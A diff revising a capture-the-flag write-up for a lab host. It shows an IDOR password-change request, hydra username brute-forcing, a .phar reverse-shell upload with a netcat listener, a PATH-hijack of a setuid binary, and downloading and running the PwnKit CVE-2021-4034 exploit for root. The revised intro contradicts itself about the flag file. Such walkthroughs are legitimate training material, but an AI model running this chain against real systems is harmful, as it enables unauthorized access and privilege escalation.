@@ -1,10 +1,18 @@
-# CTF 03
+## CTF 03
+> Capture The Flag.
+> 
+> IP: 192.168.10.16
+> 
+> The flag is stored in the flag.txt file.
 
->IP=192.168.10.16
->
->The flag is stored in the root.txt file.
+> Capture The Flag.
+> 
+> IP: 192.168.10.16
+> 
+> The flag is stored in the root.txt file.
 
-## nmap
+### Scanning
+As a first step, all open ports are scanned.
 
 ```bash
 $ nmap -sV -Pn $IP -p-
@@ -21,7 +29,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds
 
 ```
 
-## gobuster
+The scan shows that there are two running services, a webserver and SSH. The webserver is now scanned using gobuster.
 
 ```bash
 $ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt    
@@ -54,22 +62,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-With "gobuster" we found interesting the discovery of the "upload" directory which opens the possibility to maybe upload a file to the machine.
+With gobuster we found the interesting discovery of the "upload" directory which opens the possibility to maybe upload a file to the machine.
 
-## http
-`$IP:80`
-apache server with php.
+### Registering
+In a browser the website is opened and an account with the following data is created.
 
-Open in browser, register an account.
 ```
 username: pascal
 email: pascal@bosym.de
 password: pascal
 ```
 
-### Change password
+![Register an account](ctf3/register.png)
 
-Using a authenticated account and burb, we manage to change the password of other userids by changing the id in the post request using burp.
+### Changing passwords
+Using the authenticated account and burbsuite, we manage to change the password of other users by changing the id in the post request using burp. Changing the password of user 1 and 2, since our account is 3.
 
 ```
 POST /dashboard.php?id=3 HTTP/1.1
@@ -78,30 +85,28 @@ Host: 192.168.10.16
 password=root&id=1
 ```
 
-Changed the password of user 1 and 2, since my account is 3.
-
-Now find the usernames using bruteforce by creating new users. if the username exists the registration will fail:
+Now to find the corresponding usernames, we bruteforce creating new users using hydra. If the username exists the registration will fail:
 
 ```bash
-$ hydra -L /usr/share/wordlists/simple-users.txt -p root $IP http-post-form "/register.php:username=^USER^&password=^USER^&email=^USER^%40bosym.de:Register Successful" -V
+$ hydra -L /usr/share/wordlists/simple-users.txt -p root $IP http-post-form
+	"/register.php:username=^USER^&password=^USER^
+	&email=^USER^%40bosym.de:Register Successful" -V
 [80][http-post-form] host: 192.168.10.16   login: admin   password: root
-[80][http-post-form] host: 192.168.10.16   login: admin   password: root
+[80][http-post-form] host: 192.168.10.16   login: GUEST   password: root
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-14 12:54:39
 ```
 
+With the output the username should either be `admin` or `GUEST`.
 
-With the output the username shoulb be either `admin` or `GUEST`.
+With this information, we login with `admin:root` and discovered that you can upload a file to the server.
 
+### Reverse shell
+The upload field shows an error, if a file without a correct ending (jpg, png, gif) is uploaded.
 
-Then, we login with `admin:root` and discovered that you can upload a file to the server.
-
-## Reverse shell
 > Sorry , Allow Ex : jpg,png,gif
 
-It works with [`.phar`](shell.phar).
-
-`nc -lvp 1337`
+Weirdly enough, it works with `.phar`, which is bascially a `.php` script. So we upload a php reverse shell and connect it to the attacker machine.
 
 ```bash
 $ id
@@ -134,7 +139,7 @@ drwxrwx--- 2 john     www-data 4.0K Jun 14 15:15 .ssh
 
 ```
 
-We found there is a [`toto`](toto) binary file. Using [`objdump -d toto > disassembly.asm`](disassemly.asm) and `strings toto`, we can see, that the calls `setgid`, `setuid` and `system` are being used. When executed the output is:
+We found that there are interesting files, which are only readable to `john`. Also there is a `toto` binary file. Using `strings toto`, we can see that the calls `setgid`, `setuid` and `system` are being used. When executed the output is:
 
 ```bash
 $ /home/john/toto
@@ -149,7 +154,7 @@ So it sets the uid for the `system('id')` command. From the [Linux man page](htt
 > subvert system integrity.  For example, PATH could be manipulated
 > so that an arbitrary program is executed with privilege.
 
-so we change the path variable, create a "fake" `id`, execute it and change the path back.
+So we change the PATH variable, create a "fake" `id` (which executes `bash`), execute it and change the PATH back.
 
 ```bash
 $ echo $PATH
@@ -162,7 +167,8 @@ $ chmod +x id
 
 $ PATH=/home/john ./toto
 
-john@darkhole:/home/john$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+john@darkhole:/home/john$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
+	/usr/bin:/sbin:/bin:/snap/bin
 
 john@darkhole:/home/john$ cat password
 root123
@@ -171,19 +177,20 @@ john@darkhole:/home/john$ cat user.txt
 cyberctfd{0yjA5vhJWYkTXX2UALbw8Q7yMKqASU73}
 ```
 
-Now we can login via ssh with `john:root123` using `ssh john@$IP` to close the reverse shell.
+Now we can login via ssh with `john:root123` using `ssh john@192.168.10.16` to close the reverse shell.
 
 
-## Privilege escalation
+### Privilege escalation
 
-With "john" as user, run [linpeas](https://github.com/carlospolop/PEASS-ng) ([Output](linpeas.txt)) to search for ways to escalate privilege.
+With "john" as user, run [linpeas](https://github.com/carlospolop/PEASS-ng) to search for ways to escalate privilege.
 
 The logs show a possibility for CVE-2021-4034.
 
-Using the [PoC for PwnKit](https://github.com/arthepsy/CVE-2021-4034), compile and run it.
+Since gcc and make are available, we download the [PoC for PwnKit](https://github.com/arthepsy/CVE-2021-4034), compile and run it.
 
 ```bash
-john@darkhole:~$ wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+john@darkhole:~$ wget https://raw.githubusercontent.com/arthepsy/
+	CVE-2021-4034/main/cve-2021-4034-poc.c
 2022-06-14 16:24:48 (116 MB/s) - ‘cve-2021-4034-poc.c’ saved [1267/1267]
 
 john@darkhole:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
@@ -209,9 +216,3 @@ drwxr-xr-x  3 root root 4.0K Jul 15  2021 snap
 # cat /root/root.txt
 cyberctfd{lBCz8J3tRZgCqUY3O8QQygKuIzURuLql}
 ```
-
-## Flags
-
-User: `cyberctfd{0yjA5vhJWYkTXX2UALbw8Q7yMKqASU73}`
-
-Root: `cyberctfd{lBCz8J3tRZgCqUY3O8QQygKuIzURuLql}`
